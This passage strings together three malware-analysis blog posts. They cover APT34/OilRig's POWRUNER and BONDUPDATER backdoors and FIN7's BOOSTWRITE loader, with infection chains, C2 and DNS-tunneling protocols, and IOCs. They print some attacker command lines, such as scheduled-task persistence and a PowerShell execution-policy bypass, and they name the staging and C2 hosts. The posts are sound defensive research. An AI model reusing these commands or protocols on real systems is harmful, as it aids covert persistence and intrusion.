1) is used to call the “WinExec” function from kernel32.dll, as depicted in the instruction at 00430c12, which calls the “WinExec” function.\\nFigure 1: Disassembly of overwritten function address\\nAfter exploitation, the ‘WinExec’ function is successfully called to create a child process, “mshta.exe”, in the context of current logged on user. The process “mshta.exe” downloads a malicious script from hxxp://mumbai-m.site/b.txt and executes it, as seen in Figure 2.\\nFigure 2: Attacker data copied to corrupt stack buffer\\nExecution Workflow\\nThe malicious script goes through a series of steps to successfully execute and ultimately establish a connection to the command and control (C2) server. The full sequence of events starting with the exploit document is illustrated in Figure 3.\\nFigure 3: CVE-2017-11882 and POWRUNER attack sequence\\nThe malicious .rtf file exploits CVE-2017-11882.\\nThe malware overwrites the function address with an existing instruction from EQNEDT32.EXE.\\nThe malware creates a child process, “mshta.exe,” which downloads a file from: hxxp://mumbai-m.site/b.txt.\\nb.txt contains a PowerShell command to download a dropper from: hxxp://dns-update.club/v.txt. The PowerShell command also renames the downloaded file from v.txt to v.vbs and executes the script.\\nThe v.vbs script drops four components (hUpdateCheckers.base, dUpdateCheckers.base, cUpdateCheckers.bat, and GoogleUpdateschecker.vbs) to the directory: C:\\\\ProgramData\\\\Windows\\\\Microsoft\\\\java\\\\\\nv.vbs uses CertUtil.exe, a legitimate Microsoft command-line program installed as part of Certificate Services, to decode the base64-encoded files hUpdateCheckers.base and dUpdateCheckers.base, and drop hUpdateCheckers.ps1 and dUpdateCheckers.ps1 to the staging directory.\\ncUpdateCheckers.bat is launched and creates a scheduled task for GoogleUpdateschecker.vbs persistence.\\nGoogleUpdateschecker.vbs is executed after sleeping for five seconds.\\ncUpdateCheckers.bat and *.base are deleted from the staging directory.\\nFigure 4 contains an excerpt of the v.vbs script pertaining to the Execution Workflow section.\\nFigure 4: Execution Workflow Section of v.vbs\\nAfter successful execution of the steps mentioned in the Execution Workflow section, the Task Scheduler will launch GoogleUpdateschecker.vbs every minute, which in turn executes the dUpdateCheckers.ps1 and hUpdateCheckers.ps1 scripts. These PowerShell scripts are final stage payloads – they include a downloader with domain generation algorithm (DGA) functionality and the backdoor component, which connect to the C2 server to receive commands and perform additional malicious activities.\\nhUpdateCheckers.ps1 (POWRUNER)\\nThe backdoor component, POWRUNER, is a PowerShell script that sends and receives commands to and from the C2 server. POWRUNER is executed every minute by the Task Scheduler. Figure 5 contains an excerpt of the POWRUNER backdoor.\\nFigure 5: POWRUNER PowerShell script hUpdateCheckers.ps1\\nPOWRUNER begins by sending a random GET request to the C2 server and waits for a response. The server will respond with either “not_now” or a random 11-digit number. If the response is a random number, POWRUNER will send another random GET request to the server and store the response in a string. POWRUNER will then check the last digit of the stored random number response, interpret the value as a command, and perform an action based on that command. The command values and the associated actions are described in Table 1.\\nCommand\\nDescription\\nAction\\n0\\nServer response string contains batch commands\\nExecute batch commands and send results back to server\\n1\\nServer response string is a file path\\nCheck for file path and upload (PUT) the file to server\\n2\\nServer response string is a file path\\nCheck for file path and download (GET) the file\\nTable 1: POWRUNER commands\\nAfter successfully executing the command, POWRUNER sends the results back to the C2 server and stops execution.\\nThe C2 server can also send a PowerShell command to capture and store a screenshot of a victim’s system. POWRUNER will send the captured screenshot image file to the C2 server if the “fileupload” command is issued. Figure 6 shows the PowerShell “Get-Screenshot” function sent by the C2 server.\\nFigure 6: Powershell Screenshot Functionality\\ndUpdateCheckers.ps1 (BONDUPDATER)\\nOne of the recent advancements by APT34 is the use of DGA to generate subdomains. The BONDUPDATER script, which was named based on the hard-coded string “B007”, uses a custom DGA algorithm to generate subdomains for communication with the C2 server.\\nDGA Implementation\\nFigure 7 provides a breakdown of how an example domain (456341921300006B0C8B2CE9C9B007.mumbai-m.site) is generated using BONDUPDATER’s custom DGA.\\nFigure 7: Breakdown of subdomain created by BONDUPDATER\\nThis is a randomly generated number created using the following expression: $rnd = -join (Get-Random -InputObject (10..99) -Count (%{ Get-Random -InputObject (1..6)}));\\nThis value is either 0 or 1. It is initially set to 0. If the first resolved domain IP address starts with 24.125.X.X, then it is set to 1.\\nInitially set to 000, then incremented by 3 after every DNS request\\nFirst 12 characters of system UUID.\\n“B007” hardcoded string.\\nHardcoded domain “mumbai-m.site”\\nBONDUPDATER will attempt to resolve the resulting DGA domain and will take the following actions based on the IP address resolution:\\nCreate a temporary file in %temp% location\\nThe file created will have the last two octets of the resolved IP addresses as its filename.\\nBONDUPDATER will evaluate the last character of the file name and perform the corresponding action found in Table 2.\\nCharacter\\nDescription\\n0\\nFile contains batch commands, it executes the batch commands\\n1\\nRename the temporary file as .ps1 extension\\n2\\nRename the temporary file as .vbs extension\\nTable 2: BONDUPDATER Actions\\nFigure 8 is a screenshot of BONDUPDATER’s DGA implementation.\\nFigure 8: Domain Generation Algorithm\\nSome examples of the generated subdomains observed at time of execution include:\\n143610035BAF04425847B007.mumbai-m.site\\n835710065BAF04425847B007.mumbai-m.site\\n376110095BAF04425847B007.mumbai-m.site\\nNetwork Communication\\nFigure 9 shows example network communications between a POWRUNER backdoor client and server.\\nFigure 9: Example Network Communication\\nIn the example, the POWRUNER client sends a random GET request to the C2 server and the C2 server sends the random number (99999999990) as a response. As the response is a random number that ends with ‘0’, POWRUNER sends another random GET request to receive \\xa0an additional command string. The C2 server sends back Base64 encoded response.\\nIf the server had sent the string “not_now” as response, as shown in Figure 10, POWRUNER would have ceased any further requests and terminated its execution.\\nFigure 10: Example \"not now\" server response\\nBatch Commands\\nPOWRUNER may also receive batch commands from the C2 server to collect host information from the system. This may include information about the currently logged in user, the hostname, network configuration data, active connections, process information, local and domain administrator accounts, an enumeration of user directories, and other data. An example batch command is provided in Figure 11.\\nFigure 11: Batch commands sent by POWRUNER C2 server\\nAdditional Use of POWRUNER / BONDUPDATER\\nAPT34 has used POWRUNER and BONDUPDATER to target Middle East organizations as early as July 2017. In July 2017, a FireEye Web MPS appliance detected and blocked a request to retrieve and install an APT34 POWRUNER / BONDUPDATER downloader file. During the same month, FireEye observed APT34 target a separate Middle East organization using a malicious .rtf file (MD5: 63D66D99E46FB93676A4F475A65566D8) that exploited CVE-2017-0199. This file issued a GET request to download a malicious file from:\\nhxxp://94.23.172.164/dupdatechecker.doc.\\nAs shown in Figure 12, the script within the dupatechecker.doc file attempts to download another file named dupatechecker.exe from the same server. The file also contains a comment by the malware author that appears to be an apparent taunt to security researchers.\\nFigure 12: Contents of dupdatechecker.doc script\\nThe dupatechecker.exe file (MD5: C9F16F0BE8C77F0170B9B6CE876ED7FB) drops both BONDUPDATER and POWRUNER. These files connect to proxychecker.pro for C2.\\nOutlook and Implications\\nRecent activity by APT34 demonstrates that they are capable group with potential access to their own development resources. During the past few months, APT34 has been able to quickly incorporate exploits for at least two publicly vulnerabilities (CVE-2017-0199 and CVE-2017-11882) to target organizations in the Middle East. We assess that APT34’s efforts to continuously update their malware, including the incorporation of DGA for C2, demonstrate the group’s commitment to pursing strategies to deter detection. We expect APT34 will continue to evolve their malware and tactics as they continue to pursue access to entities in the Middle East region.\\nIOCs\\nFilename / Domain / IP Address\\nMD5 Hash or Description\\nCVE-2017-11882 exploit document\\nA0E6933F4E0497269620F44A083B2ED4\\nb.txt\\n9267D057C065EA7448ACA1511C6F29C7\\nv.txt/v.vbs\\nB2D13A336A3EB7BD27612BE7D4E334DF\\ndUpdateCheckers.base\\n4A7290A279E6F2329EDD0615178A11FF\\nhUpdateCheckers.base\\n841CE6475F271F86D0B5188E4F8BC6DB\\ncUpdateCheckers.bat\\n52CA9A7424B3CC34099AD218623A0979\\ndUpdateCheckers.ps1\\nBBDE33F5709CB1452AB941C08ACC775E\\nhUpdateCheckers.ps1\\n247B2A9FCBA6E9EC29ED818948939702\\nGoogleUpdateschecker.vbs\\nC87B0B711F60132235D7440ADD0360B0\\nhxxp://mumbai-m.site\\nPOWRUNER C2\\nhxxp://dns-update.club\\nMalware Staging Server\\nCVE-2017-0199 exploit document\\n63D66D99E46FB93676A4F475A65566D8\\n94.23.172.164:80\\nMalware Staging Server\\ndupdatechecker.doc\\nD85818E82A6E64CA185EDFDDBA2D1B76\\ndupdatechecker.exe\\nC9F16F0BE8C77F0170B9B6CE876ED7FB\\nproxycheker.pro\\nC2\\n46.105.221.247\\nHas resolved mumbai-m.site & hpserver.online\\n148.251.55.110\\nHas resolved mumbai-m.site and dns-update.club\\n185.15.247.147\\nHas resolved dns-update.club\\n145.239.33.100\\nHas resolved dns-update.club\\n82.102.14.219\\nHas resolved ns2.dns-update.club & hpserver.online & anyportals.com\\nv7-hpserver.online.hta\\nE6AC6F18256C4DDE5BF06A9191562F82\\ndUpdateCheckers.base\\n3C63BFF9EC0A340E0727E5683466F435\\nhUpdateCheckers.base\\nEEB0FF0D8841C2EBE643FE328B6D9EF5\\ncUpdateCheckers.bat\\nFB464C365B94B03826E67EABE4BF9165\\ndUpdateCheckers.ps1\\n635ED85BFCAAB7208A8B5C730D3D0A8C\\nhUpdateCheckers.ps1\\n13B338C47C52DE3ED0B68E1CB7876AD2\\ngoogleupdateschecker.vbs\\nDBFEA6154D4F9D7209C1875B2D5D70D5\\nhpserver.online\\nC2\\nv7-anyportals.hta\\nEAF3448808481FB1FDBB675BC5EA24DE\\ndUpdateCheckers.base\\n42449DD79EA7D2B5B6482B6F0D493498\\nhUpdateCheckers.base\\nA3FCB4D23C3153DD42AC124B112F1BAE\\ndUpdateCheckers.ps1\\nEE1C482C41738AAA5964730DCBAB5DFF\\nhUpdateCheckers.ps1\\nE516C3A3247AF2F2323291A670086A8F\\nanyportals.com\\nC2\\nPrevious Post\\nNext Post\\nPromotion\\nSubscribe\\nShare\\nRecent\\nRSS\\nEmail UpdatesInformation and insight on today\\'s advanced threats from FireEye.\\nShare\\nRecent Posts\\n24 Feb 2020Ransomware Against the Machine: How Adversaries are Learning to Disrupt\\nIndustrial Production by Targeting IT and OT\\n20 Feb 2020M-Trends 2020: Insights From the Front Lines\\n19 Feb 2020The Missing LNK — Correlating User Search LNK files\\nRSS Feed: Stay Connected\\nCompany\\nWhy FireEye?\\nCustomer Stories\\nCareers\\nCertifications and Compliance\\nInvestor Relations\\nSupplier Documents\\nNews and Events\\nNewsroom\\nPress Releases\\nWebinars\\nEvents\\nAwards and Honors\\nEmail Preferences\\nTechnical Support\\nIncident?\\nReport Security Issue\\nContact Support\\nCustomer Portal\\nCommunities\\nDocumentation Portal\\nFireEye Blogs\\nThreat Research\\nFireEye Stories\\nIndustry Perspectives\\nThreat Map\\nView the Latest Threats\\nContact Us\\n+1 877-347-3393\\nStay Connected\\nLinkedIn\\nTwitter\\nFacebook\\nYouTube\\nPodcast\\nCette page est également disponible en français.\\nVersion française\\nDiese Seite ist auch auf Deutsch verfügbar\\nZur deutschen Seite wechseln\\n日本語ページを\\n見る\\n해당 페이지는 한글 버전으로 보실 수 있습니다\\n바로 가기\\nContinue viewing this page in English\\nCopyright\\xa0©\\xa02020\\xa0FireEye, Inc.\\xa0All rights reserved.\\xa0Privacy & Cookies Policy | Privacy Shield | Legal Documentation\\nSite Language\\nEnglish\\nMy preferred language:\\nEnglish (English)\\nFrench (Français)\\nGerman (Deutsch)\\nJapanese (日本語)\\nKorean (한국어)\\nMore languages', \"OilRig Uses Updated BONDUPDATER to Target Middle Eastern Government\\nMenu\\nTools\\nPlaybooks\\nSpeaking Events\\nAbout Us\\nOilRig Uses Updated BONDUPDATER to Target Middle Eastern Government\\n23,277\\npeople reacted\\n0\\n9\\nmin. read\\nShare\\nBy Kyle Wilhoit and Robert Falcone\\nSeptember 12, 2018 at 4:00 PM\\nCategory: Unit 42\\nTags: BONDUPDATER, OilRig\\nThe OilRig group has been active since at least mid-2016, and continues their attack campaigns throughout the Middle East, targeting both governmental agencies and businesses on an almost routine basis. Often preferring homegrown tools and malware, OilRig continually modifies their malware and tools to accomplish their objectives. In August 2018, Unit 42 observed OilRig targeting a government organization using spear-phishing emails to deliver an updated version of a Trojan known as BONDUPDATER. BONDUPDATER is a PowerShell-based Trojan first discovered by FireEye in mid-November 2017, when OilRig targeted a different Middle Eastern governmental organization.\\nThe BONDUPDATER Trojan contains basic backdoor functionality, allowing threat actors to upload and download files, as well as the ability to execute commands. BONDUPDATER, like other OilRig tools, uses DNS tunneling to communicate with its C2 server. During the past month, Unit 42 observed several attacks against a Middle Eastern government leveraging an updated version of the BONDUPDATER malware, which now includes the ability to use TXT records within its DNS tunneling protocol for its C2 communications.\\nA New Series of Attacks\\nIn mid-August, the Oilrig threat group sent what appeared to be a highly targeted phishing email to a high-ranking office in a Middle Eastern nation. The email had no subject and what initially drew our attention to this attack was the content of the spear phishing email.\\nFigure 1. Spear phishing email sent by the Oilrig threat group\\nAttached to the email was a malicious document named “N56.15.doc” (SHA256: 7cbad6b3f505a199d6766a86b41ed23786bbb99dab9cae6c18936afdc2512f00) which contained a macro that attempted to install a new version of the BONDUPDATER Trojan.\\nFigure 2. Microsoft Word document with embedded macros and PowerShell\\nUpdated BONDUPDATER\\nThe spear-phishing email had an attached Microsoft Word document that contained a macro responsible for installing a new variant of BONDUPDATER. The macro begins this installation process by creating two files on the system at the following location:\\nC:\\\\ProgramData\\\\WindowsAppPool\\\\AppPool.vbs (SHA256: c0018a2e36c7ef8aa15b81001a19c4127ad7cd21ae410c1f854e5dadfa98b322)\\nC:\\\\ProgramData\\\\WindowsAppPool\\\\AppPool.ps1 (SHA256: d5c1822a36f2e7107d0d4c005c26978d00bcb34a587bd9ccf11ae7761ec73fb7)\\nThe macro finishes by running the dropped VBScript “AppPool.vbs” file by running “wscript C:\\\\ProgramData\\\\WindowsAppPool\\\\AppPool.vbs”. When first executed, the “AppPool.vbs” file will create the following scheduled task to execute every minute, which provides BONDUPDATER persistence and the ability to continually run on the system as the Trojan does not have a main loop to carry out its functionality:\\ncmd.exe /C schtasks /create /F /sc minute /mo 1 /tn “\\\\WindowsAppPool\\\\AppPool” /tr “wscript /b “C:\\\\ProgramData\\\\WindowsAppPool\\\\AppPool.vbs””\\nAfter creating the scheduled task, the VBScript will execute the “AppPool.ps1” script dropped by the macro using the following command line:\\nPowerShell.exe -exec bypass -file C:\\\\ProgramData\\\\WindowsAppPool\\\\AppPool.ps1\\nSubsequent executions of “AppPool.vbs” will check for the existence of a file named “quid”, which, if present, will also use the above PowerShell script to run “AppPool.ps1”. The PowerShell script creates the “quid” file upon its first execution to avoid creating multiple scheduled tasks.\\nThe “AppPool.ps1” file is a PowerShell script that is a variant of the BONDUPDATER payload. BONDUPDATER, like other OilRig payloads, uses DNS tunneling to communicate with its C2 server. This variant of the BONDUPDATER Trojan has a new lock file, which involves creating a lock file at the following location which will write the current PowerShell process identifier (PID) to this file:\\nC:\\\\ProgramData\\\\WindowsAppPool\\\\lock\\nThe purpose of this lock file is to only have one instance of the Trojan running at one time. However, it also uses this lock file to determine how long the PowerShell process has been executing, as it checks the creation time of the file lock against the current time to determine if the PowerShell process has been running for more than ten minutes. If it has, the script will stop the process based on the PID in the lock file and delete the lock file. Future executions of the PowerShell script will fully execute as the lock file will no longer exist on the system. This suggests the threat actors may have experienced issues with this Trojan running for extended periods in the past, likely related to the communication loops that we will discuss later.\\nThis BONDUPDATER variant also creates the following file that it will use to store a unique identifier for the system, which is generated by obtaining a random number between 10 and 99 and appending the first 8 characters of a generated GUID:\\nC:\\\\ProgramData\\\\WindowsAppPool\\\\quid\\nThe BONDUPDATER Trojan then creates several folders that it will use to store files it receives from the C2 server and files that it generates or gathers to send to the C2 server. The folder names are:\\nC:\\\\ProgramData\\\\WindowsAppPool\\\\files\\nC:\\\\ProgramData\\\\WindowsAppPool\\\\<unique ID from quid file>\\\\receivebox\\nC:\\\\ProgramData\\\\WindowsAppPool\\\\<unique ID from quid file>\\\\sendbox\\nC:\\\\ProgramData\\\\WindowsAppPool\\\\<unique ID from quid file>\\\\done\\nEven though the script creates the “files” folder, it does not appear that the Trojan uses these folders within the code. The Trojan uses the “receivebox” folder to store files obtained from the C2 server, while the “sendbox” folder is used to store files that the Trojan will upload to the server. The Trojan uses the filenames of the file received from the C2 server stored in the “receivebox” folder to determine how to handle the file, which is explained below.\\nThe BONDUPDATER sample retains its original command handling and C2 communication functionality. This process involves communicating with the C2 server to receive a file and using a character in the filename as the command. The Trojan’s command handler checks the trailing character of the filename to process the file contents, which can be seen in Table 1.\\nTrailing Character/Command\\nPurpose\\nDescription\\n0\\nExecute command\\nReads the contents of the file and runs them as a command with “cmd.exe”. The output of the command is saved to a file whose name starts with “proc” and is stored in the “sendbox” folder, which the Trojan will send to the C2 server.\\n1\\nDownload file\\nReads the contents of the file for a path to a file to download. Copies the specified file to a file in the “sendbox” folder for the Trojan to send to the C2 server.\\nAny other character\\nUpload file\\nUsed to store a file on the system. The file is moved to the “done” folder, which stores the file for future use. The Trojan writes “200<>path to stored file” to a file in the “sendbox” folder to notify the C2 that the file was downloaded successfully.\\nTable 1 Commands available in BONDUPDATER and their purpose\\nAfter handling the command, BONDUPDATER will send files it saved in the “sendbox” folder to the C2 server, after which it terminates and relies on the scheduled task to run again in the future.\\nAs discussed above, the BONDUPDATER Trojan uses a DNS tunneling protocol to receive files from the C2 server for processing. This particular BONDUPDATER sample includes two different variations of the DNS tunneling protocol, one using DNS A records, and one using DNS TXT records to transmit data from the C2 to the Trojan. The use of TXT records for C2 communications appears to be a new feature to the BONDUPDATER Trojan.\\nThe DNS tunneling protocol uses carefully crafted subdomains sent to the authoritative name server of the C2 domain, which in this specific sample was the domain “withyourface.com”. The Trojan generates subdomains differently when it sends data to the C2 compared to when it is looking to receive data from the C2, regardless of which DNS tunneling protocol is used for communications. The format of the generated domains for both sending and receiving starts with the previously generated GUID created to uniquely identify the system. However, the Trojan inserts a part number value and an action type character into this GUID string at random offsets. The part number value is a three-digit string that corresponds to the chunk of data the Trojan is attempting to transmit. The action type is a single character that notifies the C2 the type of communication the Trojan is carrying out. The two static characters “C” and “T” in the subdomain surround two digits, which help the C2 server find the part number and action type mixed in within the GUID string at random offsets.\\nSending data format\\n<GUID with part number and action character><sequence number><between 1 and 7 random characters>C<index of part number><index of action>T.<data chunk>.<filename>.<c2 domain>\\nReceiving data format\\n<GUID with part number and action character><sequence number><between 1 and 7 random characters>C<index of part number><index of action>T.<c2 domain>\\nDepending on whether the C2 communications use DNS A or TXT records, different action types are used when generating the subdomains to notify the C2 what format to use to respond. Table 2 shows action types used in outbound requests and the purpose of the request.\\nAction Type\\nA/TXT Communications\\nDescription\\nM\\nA/TXT\\nInitial beacon\\n0\\nA\\nProvide filename\\n1\\nA\\nProvide data\\nW\\nTXT\\nProvide filename\\nD\\nTXT\\nProvide data\\nP\\nTXT\\nTXT method failed, notify C2 to switch to A records\\nTable 2 Action types used within the DNS tunneling protocol and their purpose\\nFor example, the Trojan will begin communicating with its C2 server by sending an initial beacon with the action character “M”. This initial beacon will follow the receiving format, as seen in the following example:\\nFigure 3. Example domain for the C2 beacon with its format explained\\nThe offset to the part number and action type in the GUID above may not seem correct at first, as the action type does not appear to be at offset 8 in the string. However, this is correct, as the action type is inserted at offset 8 before the part number was inserted at offset 3. Therefore, we believe the C2 server just adds the two offsets together to find the actual location of the action type in the string.\\nOriginal Data Transfer using DNS Tunneling\\nThe original data transfer process within BONDUPDATER looked for specific A records within answers to DNS queries, shown in Table 3. The Trojan processed the A records in the C2 response to obtain a filename, which specifically looks for an IPv4 address within the A record with “24.125” in the first two octets. The Trojan appends the remaining two octets of this A record to the string “rcvd” and uses this as the filename to save future data to in the “receivebox” folder. This IP address also instructs the Trojan to treat following DNS A records as data. The following DNS A records are split on the “.” and each of the first three octets are treated as data, whereas the fourth octet is used as a counter to obtain the correct chunk of data. Lastly, the Trojan looks for the A record “1.2.3” as a signal to write the provided data to the specified file, which is then subjected to the previously mentioned file-based command handler.\\nIP Address\\nDescription\\n24.125.\\\\d.\\\\d\\nSets the filename “rcvd\\\\d\\\\d” in the “receivebox” to store data for processing\\n\\\\d.\\\\d.\\\\d.\\\\d\\nFirst three \\\\d are treated as data and the fourth is used to keep track of the sequence\\n1.2.3.\\\\d\\nInstructs the Trojan to write the data to the file and begin processing it for commands.\\nTable 3 IP Addresses and their meanings within the original data transfer process in BONDUPDATER\\nNew Data Transfer using DNS Tunneling\\nThis BONDUPDATER sample has a new method to obtain files from the C2 server using a series of DNS TXT queries. This method follows a similar process as the original method but uses DNS TXT results to obtain a filename and the data to write to the file. Once data is written to the file system, this method uses the same command handler as the original method to process the contents of the file based on the trailing character of the filename, as seen in Table 1.\\nThe C2 can initiate the new command handling functionality by responding to the initial beacon with a DNS A record of “99.250.250.199”. The script will enter a loop attempting to communicate with its C2 every 50 milliseconds, looking for a series of responses with specific characters that the script will use as instructions to determine how to handle the result of the TXT record, which can be seen in Table 4. The Trojan will split each TXT record from the C2 response on the character “>”, with the data to the left of the “>” character used as the instruction and the data to the right as the data.\\nInstruction\\nDescription\\nN\\nIdle. Set action type of next query to “W”\\nS\\nReceive data from C2. Decode data portion as base64. Sets the action type of future queries to the C2 to “D”.\\nS000s\\nUse data to as a portion of the filename to save data to. The data is appended to the string “rcvd”, which will be saved in the “receivebox” folder. Sets the action type of future queries to the C2 to “D”.\\nE\\nWrite bytes provided by the “S” command to the file resulting from the “S000s” command. The breaks the loop for the script to process the downloaded file.\\nC\\nCancel communications by exiting the loop.\\nTable 4 Instructions within the new data transfer process in BONDUPDATER and their meanings\\nWhile we have not seen the C2 use this TXT record-based communications, we believe the process would involve the C2 providing a TXT record with the “S000s” instruction to set the filename to which data is saved. The C2 would then provide a series of “S” instructions to provide data, followed by the “E” instruction to write that data to the file, which would then be subjected to the command handler.\\nConclusion\\nAs expected, OilRig is continuing their onslaught of attacks well into 2018 with continued targeting in the Middle East. Sometimes developing new tools, OilRig also often uses what has worked in the past, including developing variants of previously used tools and malware. This reduces development time and capitalizes on previous versions of the tool and its success.\\nOilrig is a highly diverse and very resourceful threat actor, employing a litany of methods and tools to compromise victims, but Palo Alto Networks customers are protected from this OilRig attack and BONDUPDATER by:\\nAutoFocus customers can track this Trojan with the Bondupdater_Docs tag\\nAll known BONDUPDATER document samples are marked with malicious verdicts in WildFire\\nAll known BONDUPDATER document C2 domains have DNS signatures and are classified as Command and Control\\nIndicators\\nBONDUPDATER C2\\nwithyourface.com\\nBONDUPDATER Dropper Docs\\n7cbad6b3f505a199d6766a86b41ed23786bbb99dab9cae6c18936afdc2512f00\\nc0018a2e36c7ef8aa15b81001a19c4127ad7cd21ae410c1f854e5dadfa98b322\\nd5c1822a36f2e7107d0d4c005c26978d00bcb34a587bd9ccf11ae7761ec73fb7\\nGet updates from\\nPalo Alto Networks!\\nSign up to receive the latest news, cyber threat intelligence and research from us\\nPlease enter your email address!\\nPlease mark, I'm not a robot!\\nBy submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.\\nPopular ResourcesResource Center\\nBlog\\nCommunities\\nTech Docs\\nUnit 42\\nSitemap\\nLegal NoticesPrivacy\\nTerms of Use\\nDocuments\\nAccountManage Subscriptions\\nReport a Vulnerability\\n© 2020 Palo Alto Networks, Inc.

In this blog, we reveal two of FIN7’s new tools that we have called BOOSTWRITE and RDFSNIFFER.\\nThe first of FIN7\\'s new tools is BOOSTWRITE – an in-memory-only dropper that decrypts embedded payloads using an encryption key retrieved from a remote server at runtime. FIN7 has been observed making small changes to this malware family using multiple methods to avoid traditional antivirus detection, including a BOOSTWRITE sample where the dropper was signed by a valid Certificate Authority. One of the analyzed BOOSTWRITE variants contained two payloads: CARBANAK and RDFSNIFFER. While CARBANAK has been thoroughly analyzed and has been used maliciously by several financial attackers including FIN7, RDFSNIFFER is a newly-identified tool recovered by Mandiant investigators.\\nRDFSNIFFER, a payload of BOOSTWRITE, appears to have been developed to tamper with NCR Corporation\\'s “Aloha Command Center” client. NCR Aloha Command Center is a remote administration toolset designed to manage and troubleshoot systems within payment card processing sectors running the Command Center Agent. The malware loads into the same process as the Command Center process by abusing the DLL load order of the legitimate Aloha utility. Mandiant provided this information to NCR.\\nBOOSTWRITE Loader: Where You At?\\nBOOSTWRITE is a loader crafted to be launched via abuse of the DLL search order of applications which load the legitimate ‘Dwrite.dll’ provided by the Microsoft DirectX Typography Services. The application loads the ‘gdi’ library, which loads the ‘gdiplus’ library, which ultimately loads ‘Dwrite’. Mandiant identified instances where BOOSTWRITE was placed on the file system alongside the RDFClient binary to force the application to import DWriteCreateFactory from it rather than the legitimate DWrite.dll.\\nOnce loaded, `DWrite.dll` connects to a hard-coded IP and port from which it retrieves a decryption key and initialization vector (IV) to decrypt two embedded payload DLLs. To accomplish this task, the malware first generates a random file name to be used as a text log under the current user\\'s %TEMP% directory; this filename starts with ~rdf and is followed by a set of random numbers. Next, the malware scans its own image to find the location of a 32-byte long multi-XOR key which is used to decode data inside its body. Part of the decoded data is an IP address and port which are used to retrieve the key and the IV for the decryption of the embedded payloads. The encryption algorithm uses the ChaCha stream cipher with a 256-bit key and 64-bit IV.\\nOnce the key and the IV are downloaded the malware decrypts the embedded payloads and performs sanity checks on the results. The payloads are expected to be PE32.DLLs which, if the tests pass, are loaded into memory without touching the filesystem.\\nThe malware logs various plaintext messages to the previously created logfile %TEMP%\\\\~rds<rnd_numbers> which are indicative of the loader’s execution progress. An example of the file content is shown in Figure 1:\\nLoading...\\nStarting...\\nInit OK\\nKey OK\\nData: 4606941\\nHS: 20\\nK:32 V:8\\nDCnt: 732642317(ERR)\\nFigure 1: BOOSTWRITE log file\\nBefore exiting, the malware resolves the location of the benign DWrite.dll library and passes the execution control to its DWriteCreateFactory method.\\nThe malware decrypts and loads two payload DLLs. One of the DLLs is an instance of the CARBANAK backdoor; the other DLL is a tool tracked by FireEye as RDFSNIFFER which allows an attacker to hijack instances of the NCR Aloha Command Center Client application and interact with victim systems via existing legitimate 2FA sessions.\\nRDFSNIFFER Module: We Smell a RAT\\nRDFSNIFFER is a module loaded by BOOSTWRITE which allows an attacker to monitor and tamper with legitimate connections made via NCR Corporation’s ‘Aloha Command Center Client’ (RDFClient), an application designed to provide visibility and system management capabilities to remote IT techs. RDFSNIFFER loads into the same process as the legitimate RDFClient by abusing the utility’s DLL load order, launching each time the ‘Aloha Command Center Client’ is executed on an impacted system.\\nWhen the RDFSNIFFER module is loaded by BOOSTWRITE it hooks several Win32 API functions intended to enable it to tamper with NCR Aloha Command Center Client sessions or hijack elements of its user-interface (Table 1). Furthermore, this enables the malware to alter the user’s last input time to ensure application sessions do not time out.\\nWin32 API Function\\nHook Description\\nCertVerifyCertificateChainPolicy\\nUsed to man-in-the-middle SSL sessions\\nCertGetCertificateChain\\nUsed to man-in-the-middle SSL sessions\\nWSAConnect\\nUsed to man-in-the-middle socket connections\\nconnect\\nUsed to man-in-the-middle socket connections\\nConnectEx\\nUsed to man-in-the-middle socket connections\\nDispatchMessageW\\nUsed to hijack the utility\\'s UI\\nDispatchMessageA\\nUsed to hijack the utility\\'s UI\\nDefWindowProcW\\nUsed to hijack the utility\\'s UI\\nDefWindowProcA\\nUsed to hijack the utility\\'s UI\\nGetLastInputInfo\\nUsed to change the user\\'s last input time (to avoid timed lock outs)\\nTable 1: RDFSNIFFER’s Hooked Win32 API Functions\\nThis module also contains a backdoor component that enables it to inject commands into an active RDFClient session. This backdoor allows an attacker to upload, download, execute and/or delete arbitrary files (Table 2).\\nCommand Name\\nLegit Function in RDFClient\\nRDFClient Command ID\\nDescription\\nUpload\\nFileMgrSendFile\\n107\\nUploads a file to the remote system\\nDownload\\nFileMgrGetFile\\n108\\nRetrieves a file from the remote system\\nExecute\\nRunCommand\\n3001\\nExecutes a command on the remote system\\nDeleteRemote\\nFileMgrDeleteFile\\n3019\\nDeletes file on remote system\\nDeleteLocal\\n-\\n-\\nDeletes a local file\\nTable 2: RDFSNIFFER’s Backdoor Functions\\nSigned: Yours Truly, FIN7\\nWhile the majority of BOOSTWRITE variants recovered from investigations have been unsigned, Mandiant identified a signed BOOSTWRITE sample used by FIN7 during a recent investigation. Following that discovery, a signed BOOSTWRITE sample was uploaded to VirusTotal on October 3. This executable uses a code signing certificate issued by MANGO ENTERPRISE LIMITED (Table 3).\\nMD5\\nOrganization\\nCountry\\nSerial\\na67d6e87283c34459b4660f19747a306\\nmango ENTERPRISE LIMITED\\nGB\\n32 7F 8F 10 74 78 42 4A BE B8 2A 85 DC 36 57 03 CC 82 70 5B\\nTable 3: Code signing certificate used for BOOSTWRITE\\nThis indicates the operators may be actively altering this malware to avoid traditional detection mechanisms. Notably, the signed BOOSTWRITE sample had a 0/68 detection ratio when it was uploaded to VirusTotal, demonstrating the effectiveness of this tactic (Figure 2).\\nFigure 2: Current VirusTotal detection ratio for signed BOOSTWRITE\\nUse of a code signing certificate for BOOSTWRITE is not a completely new technique for FIN7 as the group has used digital certificates in the past to sign their phishing documents, backdoors, and later stage tools. By exploiting the trust inherently provided by code certificates, FIN7 increases their chances of bypassing various security controls and successfully compromising victims. The full evasion achieved against the detection engines deployed to VirusTotal –\\xa0as compared to an unsigned BOOSTWRITE sample with an invalid checksum– illustrates that FIN7’s methods were effective in subverting both traditional detection and ML binary classification engines. This is a known issue and has been deeply studied since at least\\xa02016’s “Chains of Distrust” research\\xa0and\\xa02017’s “Certified Malware” paper. Since there are plenty of goodware samples with bad or no signatures – and a growing number of malware samples with good signatures – there is no easy solution here. The upside is that vendors selectively deploy engines to VirusTotal (including FireEye) and VT detection performance often isn’t a comprehensive representation of encountering full security technology stacks that implement detection-in-depth. Later in this blog we further explore BOOSTWRITE’s PE Authenticode signature, its anomalies, and how code signing can be turned from a detection challenge into detection opportunities.\\nOutlook and Implications\\nWhile these incidents have also included FIN7’s typical and long-used toolsets, such as CARBANAK and BABYMETAL, the introduction of new tools and techniques provides further evidence FIN7 is continuing to evolve in response to security enhancements. Further, the use of code signing in at least one case highlights the group\\'s judicious use of resources, potentially limiting their use of these certificates to cases where they have been attempting to 